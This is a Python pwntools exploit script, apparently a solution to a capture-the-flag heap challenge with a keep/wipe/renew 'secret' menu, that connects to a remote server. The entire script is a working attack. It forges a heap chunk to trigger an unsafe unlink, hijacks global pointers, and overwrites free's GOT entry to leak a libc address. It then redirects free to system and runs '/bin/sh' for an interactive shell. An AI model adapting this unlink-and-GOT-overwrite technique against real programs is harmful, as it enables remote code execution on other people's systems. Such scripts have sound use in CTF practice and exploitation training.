#!/usr/bin/env python
from pwn import *
context.update(arch='amd64', os='linux')
p, u = pack, unpack

conn = remote('52.68.31.117', 5566)

def read_menu(n=3):
    for _ in xrange(n):
        conn.recvline()

read_menu(2)

SMALL = 1
BIG = 2
HUGE = 3

def keep_secret(secret, data):
    read_menu(3)
    conn.send('1'.ljust(4, '\0'))
    read_menu(4)
    conn.send(str(secret).ljust(4, '\0'))
    conn.recvline()
    conn.send(data)

def wipe_secret(secret, leak=False):
    read_menu(3)
    conn.send('2'.ljust(4, '\0'))
    read_menu(4)
    conn.send(str(secret).ljust(4, '\0'))
    if leak:
        return conn.recvuntil('\n1. Keep', drop=True)

def renew_secret(secret, data):
    read_menu(3)
    conn.send('3'.ljust(4, '\0'))
    read_menu(4)
    conn.send(str(secret).ljust(4, '\0'))
    conn.recvline()
    conn.send(data)

big_secret_ptr = 0x6020A0
huge_secret_ptr = 0x6020A8
small_secret_ptr = 0x6020B0

keep_secret(HUGE, 'huge1')
wipe_secret(HUGE)

# fastbin
keep_secret(SMALL, 'small1')
wipe_secret(SMALL)

# consolidate fastbins
keep_secret(HUGE, 'huge2')
wipe_secret(SMALL)

keep_secret(BIG, 'big1')

keep_secret(SMALL, 'small2')

payload = ''
payload += p(0) # prev_size
payload += p(0xfa1) # size (prev_inuse = 1)
payload += p(big_secret_ptr - 0x10)
payload += p(big_secret_ptr - 0x10)
payload += p(0) # fd_nextsize
payload += p(0) # bk_nextsize
payload += 'A' * (0xf98 - 0x20 - 8)
payload += p(0xfa0) # prev_size
payload = payload.ljust(0xfb0 - 0x8, 'A')
payload += p(0x90) # size (prev_inuse = 0)
payload += 'B' * 0x88
payload += p(0x21) # size (prev_inuse = 1)
payload += 'C' * 0x18
payload += p(0x21) # size (prev_inuse = 1)
renew_secret(HUGE, payload)

# consolidates backwards to unlink fake chunk
wipe_secret(SMALL)

# BIG now points to big_ptr - 0x10
payload = 'A' * 0x10
payload += p(huge_secret_ptr) # big
payload += p(0) # huge
payload += p(0) # small
payload += p32(1) # have_big
payload += p32(1) # have_huge
payload += p32(1) # have_small
renew_secret(BIG, payload)

def set_addr(addr):
    payload = ''
    payload += p(addr) # huge
    payload += p(addr) # small
    payload += p32(1) # have_big
    payload += p32(1) # have_huge
    payload += p32(1) # have_small
    renew_secret(BIG, payload)

def write(addr, data):
    set_addr(addr)
    renew_secret(HUGE, data)

def call_func(arg, leak=False):
    set_addr(arg)
    return wipe_secret(HUGE, leak)

def leak(addr):
    return call_func(addr, leak=True)

free_got = 0x602018
libc_start_main_got = 0x602048
puts = 0x4006C0

write(free_got, p(puts))
data = leak(libc_start_main_got)
libc_start_main = u(data.ljust(8, '\0'))
libc_base = libc_start_main - 0x20740
print 'libc_base =', hex(libc_base)
system = libc_base + 0x45380
binsh = libc_base + 0x18c58b

write(free_got, p(system))
call_func(binsh)

conn.interactive(prompt='')
